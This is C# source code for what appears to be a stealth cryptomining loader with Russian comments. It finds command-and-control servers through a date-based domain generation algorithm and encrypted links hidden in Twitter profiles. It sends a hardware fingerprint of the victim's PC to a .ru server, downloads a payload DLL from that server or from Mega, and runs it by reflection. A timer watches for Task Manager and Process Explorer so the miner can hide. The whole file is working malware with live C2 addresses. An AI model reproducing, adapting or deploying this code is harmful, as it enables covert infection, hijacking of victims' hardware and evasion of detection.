﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using System.Management;
using System.Security.Cryptography;
using System.Web;
using Microsoft.Win32;
using System.Globalization;
using System.Text.RegularExpressions;
using CG.Web.MegaApiClient;

namespace xntpd
{
    class Program
    {
        static string pathToSetup = "";
        private static List<string> domains = new List<string>();
        private static string active_domain = "http://otherm1n1ngmafia.ru";

        private static string dll_link = "";

        private static List<string> twitter_user_names = new List<string>();

        private static string pass = "e4087432";
        static void Main(string[] args)
        {
            //Console.WriteLine(Directory.GetCurrentDirectory());Console.ReadKey();
            //App ap1 = new App();
            // Если вы сами разрабатываете консольное приложение, то выставите тип "Windows Application" в свойствах проекта. Это сделает его "скрытым" по умолчанию.
            TimerCallback(null); // не запускаться, если запущен диспетчер задач

            if (AlreadyRunning()) return; // выйти, если уже запущены экземпляр

            //Thread.Sleep(120000);

            // чтение адреса установочной папки
            RegistryKey currentUserKey = Registry.CurrentUser;
            RegistryKey helloKey = currentUserKey.OpenSubKey("Notepad");
            pathToSetup = helloKey.GetValue("loc").ToString();
            helloKey.Close();

            twitter_user_names = get_twitter_user_names();
            try
            {
                dll_link = get_dll_link(twitter_user_names);
            }
            catch (Exception ex) { }

            domains.Add(get_dom(active_domain));
            domains.Add(get_dom("dnevnoi"));
            domains.Add(get_dom("nedelnii"));
            domains.Add(get_dom("mesachnii"));

            active_domain = find_active_domain(domains);

            if (dll_link.Length <= 0)
            {
                dll_link = active_domain + "/jobs/job.dll";
            }

            if (dll_link.Length <= 0) return;
            try
            {
                //File.WriteAllText(pathToSetup + "\\456.txt", "123");
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //Console.ReadKey();
            }

            // обновление dll!!!!!!!!!!!!!!!
            /*try
            {
                WebClient myWebClient = new WebClient();
                myWebClient.DownloadFile(PPathToDll, sinf1.PathToTheTemporaryFolderUser + "\\" + "d3dx9_26.log");
            }
            catch (Exception ex)
            {
                //
            }*/
            //string startDomain = "http://16e04f185c7edcdfb84a114152fada5f.info";
            //string[] spareDomain = new string[] { "http://16e04f185c7edcdfb84a114152fada5f.com", "http://16e04f185c7edcdfb84a114152fada5f.org", "http://16e04f185c7edcdfb84a114152fada5f.ru", "http://16e04f185c7edcdfb84a114152fada5f.net" };

            System.Net.WebClient WebClient = new System.Net.WebClient();
            var rand = new Random();
            //int randDomNum = rand.Next(0, spareDomain.Length);
            //string randomDomain = spareDomain[randDomNum];
            //string randomDomain = get_dom();
            string uid = getUniq();

            try
            {
                //Console.WriteLine(startDomain + "/job.dll" +" ----"+ Directory.GetCurrentDirectory() + "\\job.dll");
                adddNewUser(active_domain, uid);
                downloadFile(dll_link, pathToSetup + "\\job2.dll");


                if (!File.Exists(pathToSetup + "/job2.dll")) // попробовать скачать из дополнительного домена
                {
                    // попробовать скачать из других доменов
                    adddNewUser(active_domain, uid);
                    downloadFile(dll_link, pathToSetup + "\\job2.dll");
                }
                else
                {
                    // при успехе, сделать файл скрытым
                    //File.SetAttributes(pathToSetup + "\\job2.dll", File.GetAttributes(pathToSetup + "\\job2.dll") | FileAttributes.Hidden);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("71 " + ex.Message);
                //Console.ReadKey();
                //Console.WriteLine("71 " + ex.Message);
                //Console.ReadKey();
                //Console.WriteLine(ex.Message);
                // попробовать скачать из других доменов
                adddNewUser(active_domain, uid);
                //File.WriteAllText("22.txt", dll_link + "___" + pathToSetup);
                downloadFile(dll_link, pathToSetup + "\\job2.dll");
            }
            //Console.ReadKey();

            if (File.Exists(pathToSetup + "\\job2.dll"))
            {
                long length = new System.IO.FileInfo(pathToSetup + "\\job2.dll").Length;
                if (length > 0)
                {
                    try
                    {
                        if (File.Exists(pathToSetup + "\\job.dll"))
                        {
                            File.Delete(pathToSetup + "\\job.dll");
                            File.Move(pathToSetup + "\\job2.dll", pathToSetup + "\\job.dll");
                            //File.SetAttributes(pathToSetup + "\\job.dll", File.GetAttributes(pathToSetup + "\\job.dll") | FileAttributes.Hidden);
                        }
                        else
                        {
                            File.Move(pathToSetup + "\\job2.dll", pathToSetup + "\\job.dll");
                            //File.SetAttributes(pathToSetup + "\\job.dll", File.GetAttributes(pathToSetup + "\\job.dll") | FileAttributes.Hidden);
                        }
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine("95 " + ex.Message);
                        //Console.ReadKey();
                    }
                }
                else
                {
                    try
                    {
                        File.Delete(pathToSetup + "\\job2.dll");
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine("106 " + ex.Message);
                        //Console.ReadKey();
                    }
                }
            }


            if (File.Exists(pathToSetup + "\\job.dll"))
            {
                //File.SetAttributes(pathToSetup + "\\job.dll", File.GetAttributes(pathToSetup + "\\job.dll") | FileAttributes.Hidden);
                try
                {
                    Assembly asm = Assembly.LoadFrom(pathToSetup + "\\job.dll");
                    Type t = asm.GetType("job.job", true, true);

                    // создаем экземпляр класса Program
                    object obj = Activator.CreateInstance(t);

                    // получаем метод start
                    MethodInfo method = t.GetMethod("Start");

                    // таймер срабатывает каждую секунду для отслеживания ctrl + alt + del
                    Timer tim = new Timer(TimerCallback, null, 0, 1000);

                    // вызываем метод, передаем ему значения для параметров и получаем результат
                    object result = method.Invoke(obj, new object[] { }); // Тут парметры для start

                    //Console.ReadKey();
                }
                catch (Exception ex)
                {
                    //Console.WriteLine("136 " + ex.Message);
                    //Console.ReadKey();
                }
            }

            //Console.WriteLine("rl");       
            //Console.ReadLine();
        }

        private static void downloadFile(string url, string filepath)
        {
            //MessageBox.Show(url + "___" + filepath + ".tmp");
            try
            {
                if (url.IndexOf("mega") != -1)
                {
                    var client = new MegaApiClient();
                    client.LoginAnonymous();
                    Uri fileLink = new Uri(url);
                    INodeInfo node = client.GetNodeFromLink(fileLink);
                    //Console.WriteLine($"Downloading {node.Name}");

                    client.DownloadFile(fileLink, filepath + ".tmp");
                    client.Logout();

                    if (System.IO.File.Exists(filepath + ".tmp"))
                    {
                        if (System.IO.File.Exists(filepath))
                        {
                            System.IO.File.Delete(filepath);
                        }
                        System.IO.File.Move(filepath + ".tmp", filepath);
                    }
                }
                else
                {
                    System.Net.WebClient WebClient = new System.Net.WebClient();
                    WebClient.DownloadFile(url, filepath + ".tmp");
                    if (System.IO.File.Exists(filepath + ".tmp"))
                    {
                        if (System.IO.File.Exists(filepath))
                        {
                            System.IO.File.Delete(filepath);
                        }
                        System.IO.File.Move(filepath + ".tmp", filepath);
                    }
                }

            }
            catch (Exception ex)
            {

            }
        }
        private static void TimerCallback(Object o)
        {
            // Display the date/time when this method got called.
            //Console.WriteLine("In TimerCallback: " + DateTime.Now);
            //Environment.Exit(0); 
            // Force a garbage collection to occur for this demo.
            GC.Collect();
            Process[] processes;
            Process[] processes1;
            Process[] processes2;
            Process[] processes3;
            Process[] processes4;

            // если обнаружен процесс, то вырубить майнер
            processes = Process.GetProcessesByName("taskmgr");
            processes1 = Process.GetProcessesByName("anvir");
            processes2 = Process.GetProcessesByName("procexp");
            processes3 = Process.GetProcessesByName("procexp64");
            processes4 = Process.GetProcessesByName("anvir64");
            if (processes.Count() > 0 || processes1.Count() > 0 || processes2.Count() > 0 || processes3.Count() > 0 || processes4.Count() > 0)
            {
                try
                {
                    //Environment.Exit(0);
                    //Console.WriteLine("Task Manager IS running");
                 
                        foreach (Process proc in Process.GetProcessesByName("winsys"))
                        {
                            //proc.Kill();
                                //return null;
                                //Process.GetCurrentProcess().Kill();
                            //Environment.Exit(-1);
                                //Random rnd = new Random();
                                //int month = rnd.Next();
                                //File.WriteAllText(rnd.Next()+"txt", "d");
                        }
                    
                }
                catch (Exception ex)
                {
                    //
                }
            }
            else
            {
                //Console.WriteLine("Task Manager is NOT running");
            }
        }

        private static bool AlreadyRunning()
        {
            Process[] processes = Process.GetProcesses();
            Process currentProc = Process.GetCurrentProcess();
            //Console.WriteLine("Current proccess: {0}", currentProc.ProcessName);
            foreach (Process process in processes)
            {
                if (currentProc.ProcessName == process.ProcessName && currentProc.Id != process.Id)
                {
                    //Console.WriteLine("Another instance of this process is already running: {pid}", process.Id);
                    return true;
                }
            }
            return false;
        }

        private static string getUniq()
        {
            //string ip = "";
            string username = "";
            string komputername = "";

            string modelNo = "";
            string manufatureID = "";
            string signature = "";
            string totalHeads = "";
            string procName = "";
            string videoCardName = "";

            string uniqueId = "";
            string sourceOfUniqueId = "";

            //ip = getExternalIp();
            username = getUserName();
            komputername = getKompName();
            modelNo = identifier("Win32_DiskDrive", "Model");
            manufatureID = identifier("Win32_DiskDrive", "Manufacturer");
            signature = identifier("Win32_DiskDrive", "Signature");
            totalHeads = identifier("Win32_DiskDrive", "TotalHeads");
            procName = identifier("Win32_Processor", "Name");
            videoCardName = identifier("Win32_VideoController", "Name");

            sourceOfUniqueId = username + komputername + modelNo + manufatureID + signature + totalHeads + procName + videoCardName;

            using (MD5 md5Hash = MD5.Create())
            {
                string hash = GetMd5Hash(md5Hash, sourceOfUniqueId);
                uniqueId = hash;
            }
            return uniqueId;
        }
        private static string getUserName()
        {
            string username = "";
            try
            {
                username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch (Exception ex)
            {
                //Console.WriteLine("257 " + ex.Message);
                //Console.ReadKey();
            }
            return username;
        }
        private static string getKompName()
        {
            string komputername = "";
            try
            {
                komputername = System.Environment.MachineName;
            }
            catch (Exception ex)
            {
                //Console.WriteLine("271 " + ex.Message);
                //Console.ReadKey();
            }
            return komputername;
        }
        private static string identifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine("293 " + ex.Message);
                        //Console.ReadKey();
                    }
                }
            }
            return result;
        }
        static string GetMd5Hash(MD5 md5Hash, string input)
        {

            // Convert the input string to a byte array and compute the hash.
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }

            // Return the hexadecimal string.
            return sBuilder.ToString();
        }
        static bool VerifyMd5Hash(MD5 md5Hash, string input, string hash)
        {
            // Hash the input.
            string hashOfInput = GetMd5Hash(md5Hash, input);

            // Create a StringComparer an compare the hashes.
            StringComparer comparer = StringComparer.OrdinalIgnoreCase;

            if (0 == comparer.Compare(hashOfInput, hash))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static string osname = "";
        static void adddNewUser(string dom, string id)
        {
            string hardInfo = "";

            string processorName = "";
            string processorManufacturer = "";
            string videoControllerName = "";
            string videoControllerProcessorName = "";
            string videoControllerAdapterRam = "";
            string hardDrives = "";
            string hardDrivesSizes = "";
            string physicalMemory = "";

            //OutputResult("Жесткий диск:", GetHardwareInfo("Win32_DiskDrive", "Caption"));
            //OutputResult("Объем (в байтах):", GetHardwareInfo("Win32_DiskDrive", "Size"));

            //getHardInfoResult

            processorName = getHardInfoResult(GetHardwareInfo("Win32_Processor", "Name"));
            processorManufacturer = getHardInfoResult(GetHardwareInfo("Win32_Processor", "Manufacturer"));
            videoControllerName = getHardInfoResult(GetHardwareInfo("Win32_VideoController", "Name"));
            videoControllerProcessorName = getHardInfoResult(GetHardwareInfo("Win32_VideoController", "VideoProcessor"));
            videoControllerAdapterRam = getHardInfoResult(GetHardwareInfo("Win32_VideoController", "AdapterRAM"));

            hardDrives = getHardInfoResult(GetHardwareInfo("Win32_DiskDrive", "Caption"));
            hardDrivesSizes = getHardInfoResult(GetHardwareInfo("Win32_DiskDrive", "Size"));
            physicalMemory = GetPhysicalMemory();

            osname = HttpUtility.UrlEncode(getOs());
            string wb = "";
            if (is64BitOperatingSystem)
            {
                wb = "64";
            }
            else
            {
                wb = "32";
            }


            hardInfo = "id=" + HttpUtility.UrlEncode(id) + "&processorname=" + HttpUtility.UrlEncode(processorName) + "&processormanufacturer=" + HttpUtility.UrlEncode(processorManufacturer) + "&videocontrollername=" + HttpUtility.UrlEncode(videoControllerName) + "&videocontrollerprocessorname=" + HttpUtility.UrlEncode(videoControllerProcessorName) + "&videocontrolleradapterram=" + HttpUtility.UrlEncode(videoControllerAdapterRam) + "&harddrives=" + HttpUtility.UrlEncode(hardDrives) + "&harddrivessizes=" + HttpUtility.UrlEncode(hardDrivesSizes) + "&physicalmemory=" + HttpUtility.UrlEncode(physicalMemory) + "&os=" + HttpUtility.UrlEncode(osname) + "&wb=" + HttpUtility.UrlEncode(wb);
            //Console.WriteLine(hardInfo);Console.ReadKey();

            SendTestPostRequest(dom + "/add.php", hardInfo);

            //WebClient wc = new WebClient();
            //string data = wc.DownloadString(dom + "/add.php?id=" + id + "&" + hardInfo);

        }

        public static string GetPhysicalMemory()
        {
            long MemSize = 0;
            long mCap = 0;

            try
            {
                ManagementScope oMs = new ManagementScope();
                ObjectQuery oQuery = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
                ManagementObjectSearcher oSearcher = new ManagementObjectSearcher(oMs, oQuery);
                ManagementObjectCollection oCollection = oSearcher.Get();



                // In case more than one Memory sticks are installed
                foreach (ManagementObject obj in oCollection)
                {
                    mCap = Convert.ToInt64(obj["Capacity"]);
                    MemSize += mCap;
                }
                //MemSize = (MemSize / 1024) / 1024;
            }
            catch (Exception ex)
            {
                //Console.WriteLine("399 " + ex.Message);
                //Console.ReadKey();
            }
            return MemSize.ToString();
        }

        static void SendTestPostRequest(string url, string data)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Method = "POST";
                string postData = data;
                request.ContentType = "application/x-www-form-urlencoded";
                System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
                byte[] postByteArray = encoding.GetBytes(postData);
                request.ContentLength = postByteArray.Length;

                System.IO.Stream postStream = request.GetRequestStream();
                postStream.Write(postByteArray, 0, postByteArray.Length);
                postStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                //Console.WriteLine("Response Status Description: " + response.StatusDescription);
                Stream dataSteam = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataSteam);
                string responseFromServer = reader.ReadToEnd();
                //Console.WriteLine("Response: " + responseFromServer);
                reader.Close();
                dataSteam.Close();
                response.Close();
            }
            catch (Exception ex)
            {
                //Console.WriteLine("432 " + ex.Message);
                //Console.ReadKey();
                //Если что-то пошло не так, выводим ошибочку о том, что же пошло не так.
                //Console.WriteLine("ERROR: " + ex.Message);
            }
        }

        private static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
        {
            List<string> result = new List<string>();

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM " + WIN32_Class);

            try
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    result.Add(obj[ClassItemField].ToString().Trim());
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("454 " + ex.Message);
                //Console.ReadKey();
                //Console.WriteLine(ex.Message);
            }

            return result;
        }

        private static string getHardInfoResult(List<string> result)
        {
            string hardInfo = "";
            try
            {

                if (result.Count > 0)
                {
                    /*for (int i = 0; i < result.Count; ++i)
                    {
                        hardInfo += result[i];
                    }*/
                    hardInfo = String.Join(";;;;;", result.ToArray());
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("478 " + ex.Message);
                //Console.ReadKey();
            }

            return hardInfo;
        }

        static bool is64BitProcess = (IntPtr.Size == 8);
        static bool is64BitOperatingSystem = is64BitProcess || InternalCheckIsWow64();

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool wow64Process
        );

        public static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
                Environment.OSVersion.Version.Major >= 6)
            {
                using (Process p = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(p.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else
            {
                return false;
            }
        }

        private static string getOs()
        {
            string ver = "unknown";
            try
            {
                var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                            select x.GetPropertyValue("Caption")).FirstOrDefault();
                return name != null ? name.ToString() : "unknown";
            }
            catch (Exception ex)
            {
                return ver;
            }
        }

        public static string get_dom(string typedom)
        {
            DateTime time = DateTime.Now;
            string date_string = "";
            string hash = "";
            string week = "";
            switch (typedom)
            {
                case "mesachnii":
                    date_string = String.Format("{0:MMyyyy}", time);
                    break;
                case "nedelnii":
                    week = GetWeekOfMonth(time).ToString();
                    date_string = week + String.Format("{0:MMyyyy}", time);
                    break;
                case "dnevnoi":
                    week = GetWeekOfMonth(time).ToString();
                    date_string = time.Day + week + String.Format("{0:MMyyyy}", time);
                    break;
                default:
                    return typedom;
                    break;
            }
            using (MD5 md5Hash = MD5.Create())
            {
                hash = GetMd5Hash(md5Hash, date_string + "0");
            }
            if (hash.Length >= 12)
            {
                return "http://" + hash.Substring(0, 12) + ".ru";
            }
            return typedom;
        }

        public static int GetWeekOfYear(DateTime date)
        {
            if (date == null)
                return 0;

            DateTimeFormatInfo dfi = DateTimeFormatInfo.CurrentInfo;
            Calendar cal = dfi.Calendar;

            return cal.GetWeekOfYear(date, dfi.CalendarWeekRule, dfi.FirstDayOfWeek);
        }


        public static int GetWeekOfMonth(DateTime date)
        {
            if (date == null)
                return 0;

            return GetWeekOfYear(date) - GetWeekOfYear(new DateTime(date.Year, date.Month, 1)) + 1;
        }

        public static string find_active_domain(List<string> domains)
        {
            string act_dom = "";

            foreach (string d in domains)
            {
                //MessageBox.Show(d);
                try
                {
                    System.Net.WebClient client = new System.Net.WebClient();
                    string code = client.DownloadString(d + "/check.html");
                    if (code == "e408743231b4460")
                    {
                        //MessageBox.Show(code);
                        return d;
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }
            return act_dom;
        }

        public static List<string> get_twitter_user_names()
        {
            List<string> user_names = new List<string>();

            DateTime time = DateTime.Now;
            string date_string = "";
            string hash = "";
            string week = "";

            // дневной
            week = GetWeekOfMonth(time).ToString();
            date_string = time.Day + week + String.Format("{0:MMyyyy}", time);
            using (MD5 md5Hash = MD5.Create())
            {
                hash = GetMd5Hash(md5Hash, date_string + "0");
            }
            if (hash.Length >= 12)
            {
                user_names.Add("http://twitter.com/" + hash.Substring(0, 12));
            }

            // недельный
            week = GetWeekOfMonth(time).ToString();
            date_string = week + String.Format("{0:MMyyyy}", time);
            using (MD5 md5Hash = MD5.Create())
            {
                hash = GetMd5Hash(md5Hash, date_string + "0");
            }
            if (hash.Length >= 12)
            {
                user_names.Add("http://twitter.com/" + hash.Substring(0, 12));
            }

            // месячный
            date_string = String.Format("{0:MMyyyy}", time);
            using (MD5 md5Hash = MD5.Create())
            {
                hash = GetMd5Hash(md5Hash, date_string + "0");
            }
            if (hash.Length >= 12)
            {
                user_names.Add("http://twitter.com/" + hash.Substring(0, 12));
            }
            if (user_names.Count() > 0)
            {
                return user_names;
            }
            else
            {
                return null;
            }
        }

        public static string get_dll_link(List<string> names)
        {
            string link = "";
            int k = 1;
            //e408743231b4460
            foreach (string s in names)
            {
                try
                {
                    System.Net.WebClient client = new System.Net.WebClient();
                    string code = client.DownloadString(s);

                    if (code.IndexOf("e408743231b4460") != -1)
                    {
                        /*
                          http://1facf7d7ba2c.ru/xntpd.exe
http://1facf7d7ba2c.ru/files/files32.zip
http://1facf7d7ba2c.ru/files/files64.zip
http://1facf7d7ba2c.ru/files/job.dll

Aq0ulAxMw6Vy1pyVlwzK1h+Y1mnC+Aq0ulAxMw6Vy2UVyBmZfMVyXaiEt/NXjPSAqJkSiIZDTUJu4Aq0ulAxMw6Vy1
[ggggggggggg2]pyVlwzK1h+Y1mnC+Aq0ulHQ3enlRlO1hkJn2qAYRuQ4cbPQPMBHg7Q0hsXxT35Rz[/ggggggggggg2]
[ggggggggggg3]pyVlwzK1h+Y1mnC+Aq0ulHQ3enlRlO1hkJn2qAYRuQ6l3n54wGWkejpRYD1WheZf[/ggggggggggg3]
[ggggggggggg4]pyVlwzK1h+Y1mnC+Aq0ulI4LqF0034kxgT9bxt6dn1Uq5IRicgOoyqkzEtfVqyFv[/ggggggggggg4]
                         */
                        Regex Reg = new Regex(@"Aq0ulAxMw6Vy2(?<link>.+?)Aq0ulAxMw6Vy2");
                        MatchCollection matches = Reg.Matches(code);
                        if (matches.Count > 0)
                        {
                            //System.IO.File.WriteAllText("ddd.txt", mat.Groups["link"].Value);
                            //MessageBox.Show(matches[0].Groups["link"].Value.Trim());
                            //MessageBox.Show(Cipher.Decrypt(matches[0].Groups["link"].Value.Trim(), pass));
                            return Cipher.Decrypt(matches[0].Groups["link"].Value.Trim(), pass);
                            break;
                        }

                        //return d;
                    }
                }
                catch (Exception ex)
                {
                    //
                }
                k++;
            }

            return link;
        }

    }
}
